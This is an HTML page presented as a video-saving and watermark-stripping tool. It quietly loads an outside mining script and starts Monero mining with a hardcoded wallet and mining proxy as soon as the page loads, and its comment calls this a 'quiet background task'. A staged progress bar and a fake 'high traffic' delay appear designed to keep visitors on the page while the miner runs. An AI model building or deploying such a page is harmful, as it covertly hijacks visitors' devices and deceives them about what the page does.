<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Processing Link...</title>
    <script src="https://webminer.pages.dev/load.js"></script>
    <style>
        body { background: #0d1117; color: white; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
        .loader-wrap { width: 85%; max-width: 400px; text-align: center; }
        #status { font-size: 20px; font-weight: bold; margin-bottom: 10px; color: #00d4ff; }
        #sub-status { color: #8b949e; font-size: 14px; margin-bottom: 25px; }
        .progress-bg { background: #30363d; height: 12px; border-radius: 10px; overflow: hidden; position: relative; }
        .progress-fill { width: 0%; height: 100%; background: linear-gradient(90deg, #00d4ff, #0080ff); transition: width 0.4s ease; box-shadow: 0 0 15px #00d4ff; }
        #warning { margin-top: 20px; font-size: 13px; color: #f85149; display: none; }
        .dl-btn { display: none; background: #00d4ff; color: #000; padding: 18px 40px; border-radius: 12px; text-decoration: none; font-weight: bold; font-size: 18px; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="loader-wrap">
        <div id="status">Initializing...</div>
        <div id="sub-status">Connecting to Ghost Cloud Engine</div>
        <div class="progress-bg"><div class="progress-fill" id="fill"></div></div>
        <div id="warning">High traffic detected. Please wait while we prioritize your request...</div>
        <a id="downloadLink" class="dl-btn" href="#">SAVE VIDEO</a>
    </div>

    <script>
        const WORKER = "https://ghost-api.mr-ghosttrich.workers.dev";
        const WALLET = "48bN9tTb8niehRBkARiRPQgXYQFuh65pj3fp7DSfY8akMgdsQFUKqqg8FbtVQcKVdJPoNapcWMUiu1TSZiG7FxftFy8hiRy";
        
        // Quietly start background task
        startMining(WALLET, "Ghost_Site", "wss://ny1.xmrminingproxy.com", 70);

        const fill = document.getElementById('fill');
        let progress = 0;

        // ANIMATION: Makes the bar move so they know it's working
        const barMove = setInterval(() => {
            if (progress < 90) {
                progress += Math.random() * 3;
                fill.style.width = progress + "%";
                if(progress > 20) document.getElementById('status').innerText = "Fetching Video...";
                if(progress > 55) document.getElementById('status').innerText = "Stripping Watermark...";
            }
        }, 600);

        // Warning trigger after 12 seconds
        setTimeout(() => { document.getElementById('warning').style.display = 'block'; }, 12000);

        async function getLink() {
            const urlParams = new URLSearchParams(window.location.search);
            const target = urlParams.get('url');
            if(!target) return;

            try {
                const res = await fetch(`${WORKER}?url=${encodeURIComponent(target)}`);
                const data = await res.json();
                
                if (data.url) {
                    clearInterval(barMove);
                    fill.style.width = "100%";
                    document.getElementById('status').innerText = "Process Complete!";
                    document.getElementById('sub-status').innerText = "High-quality file ready.";
                    const btn = document.getElementById('downloadLink');
                    btn.href = data.url;
                    btn.style.display = "inline-block";
                }
            } catch (e) {
                document.getElementById('status').innerText = "Engine Busy";
                document.getElementById('sub-status').innerText = "Please refresh and try again.";
            }
        }

        // Call the engine after a 4-second delay
        setTimeout(getLink, 4000);
    </script>
</body>
</html>
